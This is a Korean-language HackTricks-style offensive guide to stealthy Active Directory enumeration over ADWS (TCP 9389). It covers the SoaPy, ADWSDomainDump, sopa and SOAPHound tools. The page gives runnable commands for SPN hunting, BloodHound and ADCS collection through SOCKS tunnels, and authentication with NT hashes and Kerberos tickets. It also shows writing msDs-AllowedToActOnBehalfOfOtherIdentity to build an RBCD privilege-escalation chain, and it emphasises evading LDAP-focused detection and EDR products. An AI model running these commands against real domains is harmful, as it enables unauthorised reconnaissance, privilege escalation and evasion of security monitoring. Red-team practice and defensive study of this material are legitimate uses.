# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화**되어 있으며 TCP **9389**에서 수신 대기합니다. 이름과 달리 **HTTP는 사용되지 않습니다**. 대신 이 서비스는 독점적인 .NET 프레이밍 프로토콜 스택을 통해 LDAP 스타일의 데이터를 제공합니다.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

트래픽은 이러한 바이너리 SOAP 프레임 안에 캡슐화되어 흔하지 않은 포트를 통해 이동하므로, **ADWS를 통한 열거는 기존 LDAP/389 및 636 트래픽보다 검사, 필터링 또는 시그니처 탐지를 당할 가능성이 훨씬 낮습니다**. 작업자에게 이는 다음을 의미합니다.<sup>[[1]](#references)[[7]](#references)</sup>

* 더 은밀한 정찰 – Blue Team은 LDAP 쿼리에 주로 집중하는 경우가 많습니다.
* SOCKS proxy를 통해 9389/TCP를 터널링하여 **Windows가 아닌 호스트(Linux, macOS)**에서 데이터를 수집할 수 있습니다.
* LDAP를 통해 얻을 수 있는 것과 동일한 데이터(users, groups, ACLs, schema 등)를 수집하고 **쓰기** 작업도 수행할 수 있습니다(예: **RBCD**용 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS 상호작용은 WS-Enumeration을 통해 구현됩니다. 각 쿼리는 LDAP 필터/속성을 정의하는 `Enumerate` 메시지로 시작하고 `EnumerationContext` GUID를 반환한 다음, 하나 이상의 `Pull` 메시지가 이어져 서버에서 정의한 결과 창만큼 데이터를 스트리밍합니다.<sup>[[7]](#references)</sup> Context는 약 30분 후 만료되므로, 상태 손실을 방지하려면 도구가 결과를 페이지 단위로 가져오거나 필터를 분할해야 합니다(CN별 prefix 쿼리).<sup>[[8]](#references)</sup> security descriptor를 요청할 때 `LDAP_SERVER_SD_FLAGS_OID` control을 지정해 SACL을 제외해야 합니다. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 그냥 제거합니다.

> 참고: ADWS는 여러 RSAT GUI/PowerShell 도구에서도 사용되므로, 트래픽이 정상적인 관리자 활동과 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **ADWS 프로토콜 스택을 순수 Python으로 완전히 재구현한 도구**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하므로, .NET 런타임을 사용하지 않고도 Unix 계열 시스템에서 데이터를 수집할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 주요 기능

* **SOCKS를 통한 proxying** 지원(C2 implants에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세분화된 검색 필터.
* 선택적 **쓰기** 작업(`--set` / `--delete`).
* BloodHound에 바로 입력할 수 있는 **BOFHound 출력 모드**.<sup>[[3]](#references)</sup>
* 사람이 읽기 쉬운 형식이 필요할 때 timestamp / `userAccountControl`을 보기 좋게 표시하는 `--parse` flag.<sup>[[2]](#references)</sup>

### 대상 지정 수집 flag 및 쓰기 작업

SoaPy에는 ADWS를 통해 가장 흔히 사용하는 LDAP hunting 작업을 재현하는 엄선된 switch가 포함되어 있습니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`와, 사용자 지정 pull을 위한 raw `--query` / `--filter` 옵션입니다. 여기에 `--rbcd <source>`(`msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(대상 지정 Kerberoasting을 위한 SPN 준비), `--asrep`(`userAccountControl`의 `DONT_REQ_PREAUTH` 전환)과 같은 쓰기 primitive를 함께 사용할 수 있습니다.<sup>[[2]](#references)</sup>

`samAccountName`과 `servicePrincipalName`만 반환하는 대상 지정 SPN 탐색 예시:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

동일한 host/credentials를 사용해 확인된 결과를 즉시 활용하세요. `--rbcds`로 RBCD가 가능한 객체를 덤프한 다음, `--rbcd 'WEBSRV01$' --account 'FILE01$'`을 적용해 Resource-Based Constrained Delegation 체인을 구성합니다(전체 악용 절차는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)을 참조하세요).

### 설치 (operator host)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump`의 fork로, LDAP-signature 탐지를 줄이기 위해 LDAP queries 대신 TCP/9389를 통한 ADWS 호출을 사용합니다.
* `--force`를 지정하지 않으면 먼저 9389 포트에 연결할 수 있는지 확인합니다(포트 스캔이 시끄럽거나 필터링되는 경우 probe를 건너뜁니다).
* README에 Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 테스트하여 성공적으로 우회했다고 나와 있습니다.<sup>[[4]](#references)</sup>

### 설치

```bash
pipx install .
```

### 사용법

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

일반적인 출력에는 9389 연결 가능성 확인, ADWS bind, 덤프 시작 및 완료가 기록됩니다:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang용 실용적인 ADWS 클라이언트

soapy와 마찬가지로 [sopa](https://github.com/Macmod/sopa)는 Golang으로 ADWS 프로토콜 스택(MS-NNS + MC-NMF + SOAP)을 구현하며, 다음과 같은 ADWS 호출을 수행하는 명령줄 플래그를 제공합니다:<sup>[[5]](#references)</sup>

* **객체 검색 및 조회** - `query` / `get`
* **객체 수명 주기 관리** - `create [user|computer|group|ou|container|custom]` 및 `delete`
* **속성 편집** - `attr [add|replace|delete]`
* **계정 관리** - `set-password` / `change-password`
* `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등 기타 기능

### 프로토콜 매핑 주요 내용

* LDAP 스타일 검색은 속성 선택, 범위 제어(Base/OneLevel/Subtree) 및 페이지네이션을 지원하는 **WS-Enumeration**(`Enumerate` + `Pull`)을 통해 수행됩니다.
* 단일 객체 가져오기는 **WS-Transfer** `Get`을 사용하고, 속성 변경에는 `Put`, 삭제에는 `Delete`를 사용합니다.
* 기본 제공 객체 생성은 **WS-Transfer ResourceFactory**를 사용하며, 사용자 지정 객체는 YAML 템플릿으로 지정하는 **IMDA AddRequest**를 사용합니다.
* 비밀번호 작업은 **MS-ADCAP** 작업(`SetPassword`, `ChangePassword`)입니다.<sup>[[5]](#references)</sup>

### 인증 없는 메타데이터 검색 (mex)

ADWS는 자격 증명 없이 WS-MetadataExchange를 노출하므로, 인증 전에 노출 여부를 빠르게 확인할 수 있습니다:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC 검색 및 Kerberos 타겟팅 참고 사항

`--dc`를 생략하고 `--domain`을 지정하면 Sopa가 SRV를 통해 DC를 확인할 수 있습니다. 다음 순서로 쿼리하고 우선순위가 가장 높은 타겟을 사용합니다:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

운영상, 세그먼트화된 환경에서 오류를 방지하려면 DC가 제어하는 resolver를 우선 사용하세요.

* `--dns <DC-IP>`를 사용해 **모든** SRV/PTR/forward 조회가 DC DNS를 거치도록 합니다.
* UDP가 차단되어 있거나 SRV 응답이 큰 경우 `--dns-tcp`를 사용합니다.
* Kerberos가 활성화되어 있고 `--dc`가 IP인 경우, sopa는 올바른 SPN/KDC 대상으로 지정하기 위해 FQDN을 얻는 **reverse PTR** 조회를 수행합니다. Kerberos를 사용하지 않으면 PTR 조회는 수행되지 않습니다.

예시 (IP + Kerberos, DC를 통한 DNS 조회 강제):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### 인증 자료 옵션

평문 비밀번호 외에도 sopa는 ADWS 인증에 **NT 해시**, **Kerberos AES 키**, **ccache**, **PKINIT 인증서**(PFX 또는 PEM)를 지원합니다. `--aes-key`, `-c`(ccache) 또는 인증서 기반 옵션을 사용하면 Kerberos가 자동으로 사용됩니다.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### 템플릿을 통한 사용자 지정 객체 생성

임의의 객체 클래스의 경우 `create custom` 명령은 IMDA `AddRequest`에 매핑되는 YAML 템플릿을 사용합니다:<sup>[[5]](#references)</sup>

* `parentDN`과 `rdn`은 컨테이너와 상대 DN을 정의합니다.
* `attributes[].name`은 `cn` 또는 네임스페이스가 지정된 `addata:cn`을 지원합니다.
* `attributes[].type`은 `string|int|bool|base64|hex` 또는 명시적인 `xsd:*`를 허용합니다.
* `ad:relativeDistinguishedName` 또는 `ad:container-hierarchy-parent`는 포함하지 마세요. sopa가 자동으로 추가합니다.
* `hex` 값은 `xsd:base64Binary`로 변환됩니다. 빈 문자열을 설정하려면 `value: ""`를 사용하세요.

## SOAPHound – 대량 ADWS 수집 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 모든 LDAP 상호작용을 ADWS 내에서 수행하고 BloodHound v4 호환 JSON을 생성하는 .NET 수집기입니다. 먼저 `objectSid`, `objectGUID`, `distinguishedName`, `objectClass`의 전체 캐시를 구축(`--buildcache`)한 다음, 이를 재사용해 대량 `--bhdump`, `--certdump`(ADCS) 또는 `--dnsdump`(AD 통합 DNS) 작업을 수행하므로, 약 35개의 핵심 속성만 DC 외부로 전송됩니다. AutoSplit(`--autosplit --threshold <N>`)은 대규모 포리스트에서 30분 EnumerationContext 시간 초과를 피하도록 CN 접두사별로 쿼리를 자동 분할합니다.<sup>[[8]](#references)</sup>

도메인에 가입된 운영자 VM에서의 일반적인 작업 흐름:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Export된 JSON은 SharpHound/BloodHound 워크플로에 바로 넣을 수 있습니다. 후속 그래프 분석 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit을 사용하면 SOAPHound는 수백만 개 객체가 있는 포리스트에서도 안정적으로 동작하며, ADExplorer 스타일 스냅샷보다 쿼리 수를 줄일 수 있습니다.

## 은밀한 AD 수집 워크플로

다음 워크플로에서는 Linux에서 ADWS를 통해 **도메인 및 ADCS 객체**를 열거하고, 이를 BloodHound JSON으로 변환한 다음 인증서 기반 공격 경로를 탐색합니다.

1. 대상 네트워크에서 사용자의 장비로 9389/TCP 터널링합니다(예: Chisel, Meterpreter, SSH 동적 포트 포워딩 등 사용). `export HTTPS_PROXY=socks5://127.0.0.1:1080`을 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용합니다.

2. **루트 도메인 객체를 수집합니다:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC에서 ADCS 관련 객체 수집:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHound로 변환:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIP을 BloodHound GUI에 업로드**하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`와 같은 cypher 쿼리를 실행해 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` 쓰기 (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

`s4u2proxy`/`Rubeus /getticket`와 함께 사용하면 완전한 **Resource-Based Constrained Delegation** 체인을 구성할 수 있습니다([Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 도구 요약

| 목적 | 도구 | 참고 |
|---------|------|-------|
| ADWS 열거 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 읽기/쓰기 |
| 대량 ADWS 덤프 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS 모드 |
| BloodHound 수집 | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그 변환 |
| 인증서 침해 | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 프록시 가능 |
| ADWS 열거 및 객체 변경 | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS 엔드포인트와 연동하는 범용 클라이언트 - 열거, 객체 생성, 속성 수정 및 비밀번호 변경 지원 |

## References

- [1] [SpecterOps – SOAP(y)를 사용해야 하는 이유 – ADWS를 이용한 은밀한 AD 수집을 위한 운영자 가이드](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF 사양](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS를 통한 Active Directory 환경의 은밀한 열거](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS를 통해 Active Directory 데이터를 수집하는 SOAPHound 도구](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
